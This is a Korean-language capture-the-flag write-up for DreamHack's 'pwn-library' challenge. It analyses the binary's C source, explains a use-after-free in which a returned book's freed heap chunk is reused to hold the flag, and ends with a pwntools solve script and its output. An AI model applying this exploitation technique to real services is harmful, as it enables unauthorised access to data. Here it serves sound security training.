# [DreamHack] pwn-library

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 드림이가 오랜만에 도서관에 왔습니다! 원하는 책을 읽어볼까요?
> 플래그는 /home/pwnlibrary/flag.txt에 있습니다.
>
> Release: [pwn-library.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8555825/pwn-library.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162669885-1bb0a98a-30dd-4993-b4ef-c7a3d5f45ee6.png)

## Analysis

### bookstruct

```c
struct bookstruct{
	char bookname[0x20];
	char* contents;
};
```

책 이름 `0x20`바이트와, 책 내용을 가리키는 포인터로 구성되어 있다.

### borrow_book()

```c
	if(booksize >= 0x50){
		printf("[*] book storage is full!\n");
		return 1;
	}
```

책은 최대 `0x50`개까지만 빌릴 수 있다.

```c
	__uint32_t select = 0;
	printf("[*] Welcome to borrow book menu!\n");
	booklist();
	printf("[+] what book do you want to borrow? : ");
	scanf("%u", &select);
	if(select == 1){
		strcpy(listbook[booksize].bookname, "theori theory");
		listbook[booksize].contents = (char *)malloc(0x100);
		memset(listbook[booksize].contents, 0x0, 0x100);
		strcpy(listbook[booksize].contents, "theori is theori!");
	} else if(select == 2){
		strcpy(listbook[booksize].bookname, "dreamhack theory");
		listbook[booksize].contents = (char *)malloc(0x200);
		memset(listbook[booksize].contents, 0x0, 0x200);
		strcpy(listbook[booksize].contents, "dreamhack is dreamhack!");
	} else if(select == 3){
		strcpy(listbook[booksize].bookname, "einstein theory");
		listbook[booksize].contents = (char *)malloc(0x300);
		memset(listbook[booksize].contents, 0x0, 0x300);
		strcpy(listbook[booksize].contents, "einstein is einstein!");

	} else{
		printf("[*] no book...\n");
		return 1;
	}
```

빌릴 수 있는 책의 종류는 `theori theory`, `dreamhack theory`, `einstein theory` 3가지이다. 각 책마다 할당되는 청크의 크기가 다르다.

```c
	printf("book create complete!\n");
	booksize++;
	return 0;
```

`booksize`를 1 증가시키고 리턴한다.

### read_book()

```c
	for(__uint32_t i = 0; i<booksize; i++){
		printf("%u : %s\n", i, listbook[i].bookname);
	}
	printf("[+] what book do you want to read? : ");
	scanf("%u", &select);
```

`listbook`에 있는 책들의 이름을 모두 출력하고, 어떤 책을 읽을지 선택을 받는다.

```c
	if(select > booksize-1){
		printf("[*] no more book!\n");
		return 1;
	}
	printf("[*] book contents below [*]\n");
	printf("%s\n\n", listbook[select].contents);
	return 0;
```

선택한 책의 내용을 출력하고 리턴한다.

### return_book()

```c
	if(!strcmp(listbook[booksize-1].bookname, "-----returned-----")){
		printf("[*] you alreay returns last book!\n");
		return 1;
	}
	free(listbook[booksize-1].contents);
	memset(listbook[booksize-1].bookname, 0, 0x20);
	strcpy(listbook[booksize-1].bookname, "-----returned-----");
	printf("[*] lastest book returned!\n");
	return 0;
```

`listbook`에서 맨 뒤에 있는 책을 반납한다. 책의 내용이 `contents`에 저장된 청크는 free시키고, `bookname`에는 `"-----returned-----"`를 넣는다. 하지만 반납한 책을 `listbook`에서 삭제하지 않기 때문에 내용을 읽을 수는 있다.

### steal_book()

```c
	scanf("%144s", buf);
	fp = fopen(buf, "r");
```

`buf`에 파일 이름을 입력하면 `fp`가 그 파일의 포인터가 된다.

```c
		fseek(fp, 0, SEEK_END);
    	filesize = ftell(fp);
    	fseek(fp, 0, SEEK_SET);
		printf("[*] how many pages?(MAX 400) : ");
		scanf("%u", &pages);
		if(pages > 0x190){
			printf("[*] it is heavy!!\n");
			return 1;
		}
		if(filesize > pages){
			filesize = pages;
		}
		secretbook.contents = (char *)malloc(pages);
		memset(secretbook.contents, 0x0, pages);
		__uint32_t result = fread(secretbook.contents, 1, filesize, fp);
```

읽어올 수 있는 내용은 최대 `0x190`바이트이다. `secretbook.contents`에 파일의 내용이 저장되므로, `/home/pwnlibrary/flag.txt` 파일을 열면 플래그가 저장된다.

```c
		memset(secretbook.bookname, 0, 0x20);
		strcpy(secretbook.bookname, "STOLEN BOOK");
		printf("\n[*] (Siren rangs) (Siren rangs)\n");
		printf("[*] Oops.. cops take your book..\n");
		fclose(fp);
		return 0;
```

`bookname`은 `"STOLEN BOOK"`이 되는데, contents는 그대로 남아있는 채로 함수가 리턴된다.

## Exploit

`theori theory`를 빌렸다가 반납하면 `0x110`바이트 크기의 청크 하나가 free된 상태가 된다. 이 상태에서 `steal_book()`으로 플래그를 `0x100`바이트만큼 읽어오면 free된 청크를 다시 할당하여 그 청크에 플래그가 저장된다. `read_book()`으로 반납했던 책의 내용을 읽으면 플래그를 획득할 수 있다.

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/library')
else:
    r = remote('host1.dreamhack.games', 24395)

sla = r.sendlineafter

sla('[+] Select menu : ', '1')
sla('[+] what book do you want to borrow? : ', '1')
sla('[+] Select menu : ', '3')

sla('[+] Select menu : ', str(0x113))
sla('[+] whatever, where is the book? : ', '/home/pwnlibrary/flag.txt')
sla('[*] how many pages?(MAX 400) : ', str(0x100))

sla('[+] Select menu : ', '2')
sla('[+] what book do you want to read? : ', '0')

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 24395: Done
[*] Switching to interactive mode
[*] book contents below [*]
DH{0fdbcef449355e5fb15f4a674724a3c8}


1. borrow book
2. read book
3. return book
4. exit library
[+] Select menu : $
```